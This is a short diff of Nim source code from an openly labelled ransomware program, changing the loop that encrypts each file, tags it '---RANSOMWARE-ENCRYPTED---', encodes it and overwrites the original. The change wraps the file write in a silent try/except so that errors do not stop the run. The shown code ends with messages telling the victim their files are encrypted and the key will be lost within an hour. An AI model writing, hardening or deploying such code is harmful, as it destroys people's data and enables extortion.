@@ -38,7 +38,10 @@ for file in filesx:
     tmp = newString(len(contents))
   algo.encrypt(contents, tmp)
   tmp = "---RANSOMWARE-ENCRYPTED---\n" & encode(tmp)
-  writeFile(file, tmp)
+  try:
+    writeFile(file, tmp)
+  except:
+    discard
 
 echo "Alright! Now! All of your sensitive files should have been encrypted."
 echo "In an hour, you will lose the encryption key and forever lose access to all of your files."
